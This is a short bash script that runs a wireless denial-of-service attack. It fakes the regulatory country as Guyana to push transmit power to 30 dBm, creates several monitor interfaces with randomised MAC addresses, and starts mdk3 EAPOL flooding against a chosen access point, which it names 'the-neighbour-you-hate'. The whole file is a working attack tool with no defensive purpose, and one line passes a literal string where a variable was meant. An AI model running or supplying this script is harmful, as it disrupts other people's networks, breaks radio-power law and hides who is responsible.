#!/usr/bin/env bash
# set -x 

function set_power() {

    iface=$1 # interface
    co=$2   # country
    pwr=$3  # power

    iw reg set co # BO/GY
    sleep 3
    iwconfig $iface txpower $pwr
    sleep 3
    iw reg get
}

function run_mdk() {

    iface=$1
    cnt=$2
    bssid=$3
    essid=$4
    pckts=$5

    for ((i=0; i<$cnt; i++))
    do
        iw $iface interface add mon$i type monitor
        macchanger -r mon$i
    	xterm -hold -e "mdk3 mon$i x 0 -t $bssid -n $essid -s $pckts" &
    done
}

main() {

    [ -z $1 ] && { echo "No param: wlan interface..."; exit 1; }

    iface=$1
    count=3
    country="GY"
    power=30
    bssid="DE:AD:BE:EF:D0:11" 
    essid="the-neighbour-you-hate"
    pckts=50000

    set_power $iface $country $power
    run_mdk $iface $count $bssid $essid $pckts

}

main


